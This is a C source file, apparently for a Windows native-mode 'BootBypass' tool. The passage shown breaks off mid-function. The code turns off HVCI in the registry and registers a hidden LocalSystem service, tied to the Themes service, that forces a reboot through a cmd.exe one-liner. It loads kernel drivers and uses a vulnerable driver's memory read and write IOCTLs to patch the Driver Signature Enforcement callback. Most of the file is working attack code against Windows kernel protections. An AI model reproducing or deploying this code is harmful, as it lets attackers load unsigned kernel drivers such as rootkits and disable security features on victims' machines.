#include "BootBypass.h"

void __chkstk(void) {}

static ULONGLONG g_OriginalCallback = 0;

// ============================================================================
// UTILITY FUNCTIONS - String manipulation, file I/O, and display helpers
// ============================================================================

void* memset_impl(void* dest, int c, SIZE_T count) {
    unsigned char* d = (unsigned char*)dest;
    while (count--)
        *d++ = (unsigned char)c;
    return dest;
}

SIZE_T wcslen(const WCHAR* str) {
    const WCHAR* s = str;
    while (*s)
        s++;
    return s - str;
}

WCHAR* wcscpy(WCHAR* dest, const WCHAR* src) {
    WCHAR* d = dest;
    while ((*d++ = *src++) != 0);
    return dest;
}

WCHAR* wcscat(WCHAR* dest, const WCHAR* src) {
    WCHAR* d = dest + wcslen(dest);
    while ((*d++ = *src++) != 0);
    return dest;
}

int _wcsicmp_impl(const WCHAR* str1, const WCHAR* str2) {
    while (*str1 && *str2) {
        WCHAR c1 = *str1, c2 = *str2;
        if (c1 >= L'a' && c1 <= L'z')
            c1 -= 32;
        if (c2 >= L'a' && c2 <= L'z')
            c2 -= 32;
        if (c1 != c2)
            return (c1 < c2) ? -1 : 1;
        str1++;
        str2++;
    }
    if (*str1)
        return 1;
    if (*str2)
        return -1;
    return 0;
}

// Remove leading/trailing whitespace from string
void TrimString(PWSTR str) {
    PWSTR start = str, end;
    while (*start == L' ' || *start == L'\t' || *start == L'\r' || *start == L'\n')
        start++;
    if (*start == 0) {
        *str = 0;
        return;
    }
    end = start + wcslen(start) - 1;
    while (end > start && (*end == L' ' || *end == L'\t' || *end == L'\r' || *end == L'\n'))
        end--;
    // Null-terminate trimmed string
    *(end + 1) = 0;
    if (start != str)
        wcscpy(str, start);
}

// Parse string to 64-bit unsigned integer (hex/decimal)
BOOLEAN StringToULONGLONG(PCWSTR str, ULONGLONG* out) {
    ULONGLONG result = 0;
    PCWSTR p = str;

    if (p[0] == L'0' && (p[1] == L'x' || p[1] == L'X')) {
        p += 2;
        while (*p) {
            WCHAR c = *p;
            ULONGLONG digit;
            if (c >= L'0' && c <= L'9')
                digit = c - L'0';
            else if (c >= L'a' && c <= L'f')
                digit = c - L'a' + 10;
            else if (c >= L'A' && c <= L'F')
                digit = c - L'A' + 10;
            else
                return FALSE;

            if (result > (0xFFFFFFFFFFFFFFFF >> 4))
                return FALSE; // Check overflow
            result = (result << 4) | digit;
            p++;
        }
    } else {
        while (*p) {
            if (*p < L'0' || *p > L'9')
                return FALSE;

            ULONGLONG digit = *p - L'0';

            if (result > (0xFFFFFFFFFFFFFFFF - digit) / 10)
                return FALSE; // Check overflow

            result = result * 10 + digit;
            p++;
        }
    }

    *out = result;
    return TRUE;
}

// Parse string to unsigned long wrapper with 32-bit limitation
BOOLEAN StringToULONG(PCWSTR str, PULONG out) {
    ULONGLONG result;

    if (!StringToULONGLONG(str, &result))
        return FALSE;

    if (result > 0xFFFFFFFF)
        return FALSE;

    *out = (ULONG)result;
    return TRUE;
}

// Convert 64-bit value to hexadecimal string
void ULONGLONGToHexString(ULONGLONG value, PWSTR buffer, BOOLEAN includePrefix) {
    const WCHAR hexChars[] = L"0123456789ABCDEF";
    int i, offset = 0;

    if (includePrefix) {
        buffer[0] = L'0';
        buffer[1] = L'x';
        offset = 2;
    }

    for (i = 0; i < 16; i++) {
        int nibble = (value >> (60 - i * 4)) & 0xF;
        buffer[offset + i] = hexChars[nibble];
    }
    buffer[offset + 16] = 0;
}

// Output message to native console (pre-Win32 environment)
void DisplayMessage(PCWSTR message) {
    if (!message)
        return;

    WCHAR tempBuffer[512];
    SIZE_T len = wcslen(message);

    if (len >= 512)
        len = 511;

    wcscpy(tempBuffer, message);
    tempBuffer[len] = L'\0';

    UNICODE_STRING usMsg;
    RtlInitUnicodeString(&usMsg, tempBuffer);
    NtDisplayString(&usMsg);
}

// Display NTSTATUS code in hex format
void DisplayStatus(NTSTATUS status) {
    WCHAR statusMsg[20];
    WCHAR hexChars[] = L"0123456789ABCDEF";

    statusMsg[0] = L' ';
    statusMsg[1] = L'(';
    statusMsg[2] = L'0';
    statusMsg[3] = L'x';

    for (int i = 0; i < 8; i++) {
        int nibble = (status >> (28 - i * 4)) & 0xF;
        statusMsg[4 + i] = hexChars[nibble];
    }

    statusMsg[12] = L')';
    statusMsg[13] = L'\r';
    statusMsg[14] = L'\n';
    statusMsg[15] = 0;

    DisplayMessage(statusMsg);
}

// Load INI configuration file into memory buffer
BOOLEAN ReadIniFile(PCWSTR filePath, PWSTR* outBuffer) {
    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    static WCHAR staticBuffer[8192];
    LARGE_INTEGER byteOffset;

    RtlInitUnicodeString(&usFilePath, filePath);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);
    if (!NT_SUCCESS(status))
        return FALSE;

    memset_impl(staticBuffer, 0, sizeof(staticBuffer));
    byteOffset.QuadPart = 0;

    status = NtReadFile(hFile, NULL, NULL, NULL, &iosb, staticBuffer, sizeof(staticBuffer) - sizeof(WCHAR), &byteOffset, NULL);
    NtClose(hFile);

    if (!NT_SUCCESS(status) && status != 0x103)
        return FALSE;

    *outBuffer = staticBuffer;
    return TRUE;
}

// Persist DSE callback address to INI file
BOOLEAN SaveStateSection(ULONGLONG callback) {
    RemoveStateSection();

    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    LARGE_INTEGER byteOffset;

    WCHAR content[512];
    wcscpy(content, L"\r\n[DSE_STATE]\r\n");
    wcscat(content, L"OriginalCallback=");

    WCHAR hexValue[32];
    ULONGLONGToHexString(callback, hexValue, TRUE);
    wcscat(content, hexValue);
    wcscat(content, L"\r\n");

    RtlInitUnicodeString(&usFilePath, STATE_FILE_PATH);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                             NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE,
                             FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
        if (!NT_SUCCESS(status))
            return FALSE;

        // UTF-16 LE Byte Order Mark for file header
        WCHAR bom = 0xFEFF;
        byteOffset.QuadPart = 0;
        status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &bom,
                            sizeof(WCHAR), &byteOffset, NULL);
        if (!NT_SUCCESS(status)) {
            NtClose(hFile);
            return FALSE;
        }
    }

    FILE_STANDARD_INFORMATION fileInfo;
    memset_impl(&fileInfo, 0, sizeof(fileInfo));
    status = NtQueryInformationFile(hFile, &iosb, &fileInfo,
                                   sizeof(FILE_STANDARD_INFORMATION),
                                   FileStandardInformation);

    if (!NT_SUCCESS(status)) {
        NtClose(hFile);
        return FALSE;
    }

    byteOffset.QuadPart = fileInfo.EndOfFile.QuadPart;
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, content,
                        (ULONG)(wcslen(content) * sizeof(WCHAR)),
                        &byteOffset, NULL);

    NtClose(hFile);

    if (NT_SUCCESS(status)) {
        DisplayMessage(L"INFO: DSE state saved to drivers.ini\r\n");
        return TRUE;
    }

    return FALSE;
}

// Restore saved DSE callback from INI file
BOOLEAN LoadStateSection(ULONGLONG* outCallback) {
    PWSTR fileContent = NULL;

    if (!ReadIniFile(STATE_FILE_PATH, &fileContent)) {
        return FALSE;
    }

    PWSTR line = fileContent;
    BOOLEAN inDseSection = FALSE;

    // Skip BOM (Byte Order Mark) if present in UTF-16 file
    if (line[0] == 0xFEFF) {
        line++;
    }

    while (*line) {
        PWSTR nextLine = line;
        while (*nextLine && *nextLine != L'\r' && *nextLine != L'\n')
            nextLine++;

        WCHAR lineBuf[MAX_PATH_LEN];
        ULONG i = 0;
        while (line < nextLine && i < (MAX_PATH_LEN - 1))
            lineBuf[i++] = *line++;
        lineBuf[i] = 0;

        line = nextLine;
        if (*line == L'\r')
            line++;
        if (*line == L'\n')
            line++;

        TrimString(lineBuf);

        if (lineBuf[0] == L'[') {
            inDseSection = (_wcsicmp_impl(lineBuf, L"[DSE_STATE]") == 0);
            continue;
        }

        if (inDseSection && lineBuf[0] != 0 && lineBuf[0] != L';') {
            PWSTR equals = lineBuf;
            while (*equals && *equals != L'=')
                equals++;

            if (*equals == L'=') {
                *equals = 0;
                PWSTR key = lineBuf, value = equals + 1;
                TrimString(key);
                TrimString(value);

                if (_wcsicmp_impl(key, L"OriginalCallback") == 0) {
                    if (StringToULONGLONG(value, outCallback)) {
                        DisplayMessage(L"INFO: Loaded DSE state from drivers.ini\r\n");
                        return TRUE;
                    }
                }
            }
        }
    }
    return FALSE;
}

// Remove [DSE_STATE] section from INI file
BOOLEAN RemoveStateSection(void) {
    PWSTR iniContent = NULL;
    WCHAR newContent[8192];
    BOOLEAN inDseSection = FALSE;
    BOOLEAN foundDseSection = FALSE;
    BOOLEAN skipLine = FALSE;
    SIZE_T newLen = 0;

    if (!ReadIniFile(STATE_FILE_PATH, &iniContent)) {
        return FALSE;
    }

    PWSTR line = iniContent;

    // Skip BOM (Byte Order Mark) if present in UTF-16 file
    if (line[0] == 0xFEFF)
        line++;

    newContent[0] = 0;

    while (*line) {
        PWSTR lineStart = line;
        PWSTR lineEnd = line;

        while (*lineEnd && *lineEnd != L'\r' && *lineEnd != L'\n')
            lineEnd++;

        WCHAR lineBuf[MAX_PATH_LEN];
        ULONG i = 0;
        PWSTR ptr = lineStart;
        while (ptr < lineEnd && i < MAX_PATH_LEN - 1) {
            lineBuf[i++] = *ptr++;
        }
        lineBuf[i] = 0;

        line = lineEnd;
        if (*line == L'\r')
            line++;
        if (*line == L'\n')
            line++;

        WCHAR trimmedBuf[MAX_PATH_LEN];
        wcscpy(trimmedBuf, lineBuf);
        TrimString(trimmedBuf);

        BOOLEAN isSeparator = FALSE;
        if (trimmedBuf[0] == L';' && wcslen(trimmedBuf) > 10) {
            isSeparator = TRUE;
            for (ULONG j = 1; trimmedBuf[j] != 0; j++) {
                if (trimmedBuf[j] != L'=' && trimmedBuf[j] != L' ') {
                    isSeparator = FALSE;
                    break;
                }
            }
        }

        if (trimmedBuf[0] == L'[') {
            if (_wcsicmp_impl(trimmedBuf, L"[DSE_STATE]") == 0) {
                inDseSection = TRUE;
                foundDseSection = TRUE;
                skipLine = TRUE;
            } else {
                inDseSection = FALSE;
                skipLine = FALSE;
            }
        }

        if (inDseSection || (isSeparator && (foundDseSection || skipLine))) {
            if (isSeparator && inDseSection) {
                inDseSection = FALSE;
            }
            continue;
        }

        if (newLen > 0) {
            wcscat(newContent, L"\r\n");
            newLen = wcslen(newContent);
        }

        wcscat(newContent, lineBuf);
        newLen = wcslen(newContent);
    }

    if (!foundDseSection) {
        return TRUE;
    }

    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    LARGE_INTEGER byteOffset;

    RtlInitUnicodeString(&usFilePath, STATE_FILE_PATH);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                         NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE,
                         FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    // UTF-16 LE Byte Order Mark for file header
    WCHAR bom = 0xFEFF;
    byteOffset.QuadPart = 0;
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &bom,
                        sizeof(WCHAR), &byteOffset, NULL);

    if (!NT_SUCCESS(status)) {
        NtClose(hFile);
        return FALSE;
    }

    byteOffset.QuadPart = sizeof(WCHAR);
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, newContent,
                        (ULONG)(wcslen(newContent) * sizeof(WCHAR)),
                        &byteOffset, NULL);

    NtClose(hFile);

    if (NT_SUCCESS(status)) {
        DisplayMessage(L"INFO: DSE state removed from drivers.ini\r\n");
        return TRUE;
    }

    return FALSE;
}

// ============================================================================
// REBOOT GUARDIAN SERVICE - Automatic reboot mechanism
// ============================================================================

// Create a RebootGuardian service for system reboot with double protection against reboot loops.
NTSTATUS CreateRebootGuardianService(void) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    ULONG disposition;
    DWORD dwValue;

    DisplayMessage(L"INFO: Creating Reboot Guardian service...\r\n");

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, L"RebootGuardian");

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(&hKey, KEY_ALL_ACCESS, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, &disposition);
    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot create Guardian service");
        DisplayStatus(status);
        return status;
    }

    // ImagePath - executes system reboot and self-removal for protection
    RtlInitUnicodeString(&usValueName, L"ImagePath");
    WCHAR imagePath[] = L"cmd.exe /c \"sc delete RebootGuardian & reg delete HKLM\\System\\CurrentControlSet\\Services\\Themes /v DependOnService /f & shutdown /r /t 0 /f\"";
    status = NtSetValueKey(hKey, &usValueName, 0, REG_EXPAND_SZ,
                          imagePath, (ULONG)((wcslen(imagePath) + 1) * sizeof(WCHAR)));

    // DisplayName
    RtlInitUnicodeString(&usValueName, L"DisplayName");
    WCHAR displayName[] = L"BootBypass Reboot Guardian";
    NtSetValueKey(hKey, &usValueName, 0, REG_SZ,
                 displayName, (ULONG)((wcslen(displayName) + 1) * sizeof(WCHAR)));

    // Type - WIN32_OWN_PROCESS + INTERACTIVE
    RtlInitUnicodeString(&usValueName, L"Type");
    // Service type: WIN32_OWN_PROCESS | INTERACTIVE_PROCESS
    dwValue = 0x110;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    // Start - DEMAND_START (will be started by Themes dependency)
    RtlInitUnicodeString(&usValueName, L"Start");
    // Start type: SERVICE_DEMAND_START
    dwValue = 0x3;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    // ErrorControl
    RtlInitUnicodeString(&usValueName, L"ErrorControl");
    dwValue = 0x1;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    // ObjectName - LocalSystem
    RtlInitUnicodeString(&usValueName, L"ObjectName");
    WCHAR objectName[] = L"LocalSystem";
    NtSetValueKey(hKey, &usValueName, 0, REG_SZ,
                 objectName, (ULONG)((wcslen(objectName) + 1) * sizeof(WCHAR)));

    // Ensure registry changes are committed to disk
    NtFlushKey(hKey);
    NtClose(hKey);

    if (NT_SUCCESS(status)) {
        DisplayMessage(L"SUCCESS: Reboot Guardian service created\r\n");
        return STATUS_SUCCESS;
    } else {
        DisplayMessage(L"WARNING: Service created but some values failed");
        DisplayStatus(status);
        return status;
    }
}

// Clean up reboot guardian service from registry
NTSTATUS RemoveRebootGuardianService(void) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, L"RebootGuardian");

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, DELETE, &oa);
    if (NT_SUCCESS(status)) {
        NtDeleteKey(hKey);
        NtClose(hKey);
        DisplayMessage(L"INFO: Reboot Guardian service removed\r\n");
    }

    return status;
}

// Add RebootGuardian as dependency to Themes service
NTSTATUS AddThemesDependency(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;

    DisplayMessage(L"INFO: Adding Themes dependency...\r\n");

    // Open Themes service key
    RtlInitUnicodeString(&usKeyPath,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Themes");
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_WRITE, &oa);
    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot open Themes service");
        DisplayStatus(status);
        return status;
    }

    // Set DependOnService = "RebootGuardian"
    RtlInitUnicodeString(&usValueName, L"DependOnService");
    WCHAR dependency[] = L"RebootGuardian\0\0"; // REG_MULTI_SZ requires double null terminator

    status = NtSetValueKey(hKey, &usValueName, 0, REG_MULTI_SZ,
                          dependency, sizeof(dependency));

    if (NT_SUCCESS(status)) {
        // Ensure registry changes are committed to disk
        NtFlushKey(hKey);
        DisplayMessage(L"SUCCESS: Themes dependency added\r\n");
    } else {
        DisplayMessage(L"FAILED: Cannot add dependency");
        DisplayStatus(status);
    }

    NtClose(hKey);
    return status;
}

// Remove DependOnService from Themes service
NTSTATUS RemoveThemesDependency(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;

    // Open Themes service key
    RtlInitUnicodeString(&usKeyPath,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Themes");
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_WRITE, &oa);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    // Delete DependOnService value
    RtlInitUnicodeString(&usValueName, L"DependOnService");
    status = NtDeleteValueKey(hKey, &usValueName);

    if (NT_SUCCESS(status)) {
        // Ensure registry changes are committed to disk
        NtFlushKey(hKey);
        DisplayMessage(L"INFO: Themes dependency removed\r\n");
    }

    NtClose(hKey);
    return status;
}

// ============================================================================
// HVCI CHECK AND DISABLE - Memory Integrity control and reboot scheduling
// ============================================================================

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataLength;
    UCHAR Data[1];
} KEY_VALUE_PARTIAL_INFORMATION, * PKEY_VALUE_PARTIAL_INFORMATION;

#define KeyValuePartialInformation 2

// Detect HVCI status and disable if enabled (requires reboot)
BOOLEAN CheckAndDisableHVCI(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    UCHAR buffer[256];
    ULONG resultLength;
    PKEY_VALUE_PARTIAL_INFORMATION kvpi;
    ULONG currentValue;

    RtlInitUnicodeString(&usKeyPath, HVCI_REG_PATH);
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &oa);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    RtlInitUnicodeString(&usValueName, L"Enabled");
    // Zero-initialize buffer before use
    memset_impl(buffer, 0, sizeof(buffer));

    status = NtQueryValueKey(hKey, &usValueName, KeyValuePartialInformation,
                            buffer, sizeof(buffer), &resultLength);

    if (!NT_SUCCESS(status)) {
        NtClose(hKey);
        return FALSE;
    }

    kvpi = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;

    if (kvpi->Type != REG_DWORD || kvpi->DataLength != sizeof(ULONG)) {
        NtClose(hKey);
        return FALSE;
    }

    currentValue = *(ULONG*)kvpi->Data;

    if (currentValue == 1) {
        DisplayMessage(L"INFO: HVCI (Memory Integrity) is enabled\r\n");
        DisplayMessage(L"INFO: Disabling HVCI...\r\n");

        ULONG newValue = 0;
        status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &newValue, sizeof(ULONG));

        if (!NT_SUCCESS(status)) {
            DisplayMessage(L"FAILED: Cannot disable HVCI");
            DisplayStatus(status);
            NtClose(hKey);
            return FALSE;
        }

        RtlInitUnicodeString(&usValueName, L"WasEnabledBy");
        NtDeleteValueKey(hKey, &usValueName);
        // Ensure registry changes are committed to disk
        NtFlushKey(hKey);
        NtClose(hKey);

        DisplayMessage(L"INFO: Scheduling reboot via Guardian service...\r\n");

        // Create RebootGuardian service
        NTSTATUS serviceStatus = CreateRebootGuardianService();
        if (NT_SUCCESS(serviceStatus)) {
            // Add RebootGuardian as dependency to Themes - Themes will trigger the reboot
            AddThemesDependency();
            DisplayMessage(L"SUCCESS: HVCI disabled, automatic reboot scheduled\r\n");
        } else {
            DisplayMessage(L"WARNING: HVCI disabled but service creation had issues");
            DisplayStatus(serviceStatus);
            DisplayMessage(L"INFO: Please reboot manually\r\n");
        }

        return TRUE;
    }

    NtClose(hKey);
    return FALSE;
}

// Re-enable HVCI (Memory Integrity) after patching operations
NTSTATUS RestoreHVCI(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;

    DisplayMessage(L"INFO: Re-enabling HVCI for next boot...\r\n");

    // Open HVCI registry key
    RtlInitUnicodeString(&usKeyPath, HVCI_REG_PATH);
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_WRITE, &oa);
    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"WARNING: Cannot open HVCI key");
        DisplayStatus(status);
        return status;
    }

    // Set Enabled = 1
    RtlInitUnicodeString(&usValueName, L"Enabled");
    ULONG enableValue = 1;
    status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &enableValue, sizeof(ULONG));

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"WARNING: Cannot re-enable HVCI");
        DisplayStatus(status);
        NtClose(hKey);
        return status;
    }

    // Set WasEnabledBy (placeholder value for now)
    RtlInitUnicodeString(&usValueName, L"WasEnabledBy");
    ULONG wasEnabledBy = 2; // 2 = manually enabled (you can change this)
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &wasEnabledBy, sizeof(ULONG));

    // Ensure registry changes are committed to disk
    NtFlushKey(hKey);
    NtClose(hKey);

    DisplayMessage(L"SUCCESS: HVCI will be re-enabled on next boot\r\n");
    return STATUS_SUCCESS;
}

// ============================================================================
// DRIVER OPERATIONS - Kernel driver loading, unloading, and registry management
// ============================================================================

// Check if kernel driver is currently loaded in system
BOOLEAN IsDriverLoaded(PCWSTR serviceName) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    NTSTATUS status;

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, serviceName);

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    // Attempt to load driver (may return ALREADY_LOADED)
    status = NtLoadDriver(&usServiceName);

    if (status == STATUS_IMAGE_ALREADY_LOADED) {
        return TRUE;
    }

    if (NT_SUCCESS(status)) {
        NtUnloadDriver(&usServiceName);
        return FALSE;
    }

    return FALSE;
}

// Create service registry key for driver installation
NTSTATUS CreateDriverRegistryEntry(PCWSTR serviceName, PCWSTR imagePath, PCWSTR driverType, PCWSTR startType) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    ULONG disposition;
    DWORD dwValue;
    WCHAR tempBuffer[MAX_PATH_LEN];
    ULONG dataSize;

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, serviceName);

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(&hKey, KEY_ALL_ACCESS, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, &disposition);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    RtlInitUnicodeString(&usValueName, L"ImagePath");
    wcscpy(tempBuffer, imagePath);
    dataSize = (ULONG)((wcslen(tempBuffer) + 1) * sizeof(WCHAR));
    status = NtSetValueKey(hKey, &usValueName, 0, REG_EXPAND_SZ, tempBuffer, dataSize);
    if (!NT_SUCCESS(status)) {
        NtClose(hKey);
        return status;
    }

    RtlInitUnicodeString(&usValueName, L"DisplayName");
    dataSize = (ULONG)((wcslen(serviceName) + 1) * sizeof(WCHAR));
    status = NtSetValueKey(hKey, &usValueName, 0, REG_SZ, (PVOID)serviceName, dataSize);
    if (!NT_SUCCESS(status)) {
        NtClose(hKey);
        return status;
    }

    if (_wcsicmp_impl(driverType, L"KERNEL") == 0) {
        dwValue = 1;
    } else if (_wcsicmp_impl(driverType, L"FILE_SYSTEM") == 0) {
        dwValue = 2;
    } else {
        dwValue = 1;
    }

    RtlInitUnicodeString(&usValueName, L"Type");
    status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));
    if (!NT_SUCCESS(status)) {
        NtClose(hKey);
        return status;
    }

    if (_wcsicmp_impl(startType, L"BOOT") == 0) {
        dwValue = 0;
    } else if (_wcsicmp_impl(startType, L"SYSTEM") == 0) {
        dwValue = 1;
    } else if (_wcsicmp_impl(startType, L"AUTO") == 0) {
        dwValue = 2;
    } else if (_wcsicmp_impl(startType, L"DEMAND") == 0) {
        dwValue = 3;
    } else if (_wcsicmp_impl(startType, L"DISABLED") == 0) {
        dwValue = 4;
    } else {
        dwValue = 3;
    }

    RtlInitUnicodeString(&usValueName, L"Start");
    status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));
    if (!NT_SUCCESS(status)) {
        NtClose(hKey);
        return status;
    }

    dwValue = 1;
    RtlInitUnicodeString(&usValueName, L"ErrorControl");
    status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    NtClose(hKey);
    return status;
}

// Load kernel driver into system (requires SE_LOAD_DRIVER_PRIVILEGE)
NTSTATUS LoadDriver(PCWSTR serviceName, PCWSTR imagePath, PCWSTR driverType, PCWSTR startType) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    NTSTATUS status;

    status = CreateDriverRegistryEntry(serviceName, imagePath, driverType, startType);
    if (!NT_SUCCESS(status) && status != STATUS_OBJECT_NAME_COLLISION) {
        return status;
    }

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, serviceName);

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    // Attempt to load driver (may return ALREADY_LOADED)
    status = NtLoadDriver(&usServiceName);

    return status;
}

// Unload kernel driver from system
NTSTATUS UnloadDriver(PCWSTR serviceName) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, serviceName);

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    return NtUnloadDriver(&usServiceName);
}

// ============================================================================
// DSE PATCH OPERATIONS - Driver Signature Enforcement bypass via memory patching
// ============================================================================

// Write 32-bit value to physical memory via vulnerable driver
BOOLEAN WriteMemory32(HANDLE hDriver, ULONGLONG address, ULONG value, ULONG ioctl) {
    RTC_PACKET packet;
    IO_STATUS_BLOCK iosb;

    memset_impl(&packet, 0, sizeof(packet));
    memset_impl(&iosb, 0, sizeof(iosb));

    // Prepare IOCTL packet for memory operation
    packet.addr = address;
    packet.size = 4;
    packet.value = value;

    NTSTATUS status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                           ioctl, &packet, sizeof(packet),
                                           &packet, sizeof(packet));

    return NT_SUCCESS(status);
}

// Write 64-bit value as two 32-bit operations (driver limitation)
BOOLEAN WriteMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG value, ULONG ioctl) {
    if (!WriteMemory32(hDriver, address, (ULONG)(value & 0xFFFFFFFF), ioctl))
        return FALSE;
    if (!WriteMemory32(hDriver, address + 4, (ULONG)((value >> 32) & 0xFFFFFFFF), ioctl))
        return FALSE;
    return TRUE;
}

// Read 64-bit value from physical memory via IOCTL
BOOLEAN ReadMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG* value, ULONG ioctl) {
    RTC_PACKET packet;
    IO_STATUS_BLOCK iosb;
    ULONG low, high;

    memset_impl(&packet, 0, sizeof(packet));
    memset_impl(&iosb, 0, sizeof(iosb));

    // Prepare IOCTL packet for memory operation
    packet.addr = address;
    packet.size = 4;

    NTSTATUS status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                           ioctl, &packet, sizeof(packet),
                                           &packet, sizeof(packet));

    if (!NT_SUCCESS(status))
        return FALSE;
    // Extract low DWORD from 64-bit read operation
    low = packet.value;

    memset_impl(&packet, 0, sizeof(packet));
    memset_impl(&iosb, 0, sizeof(iosb));

    packet.addr = address + 4;
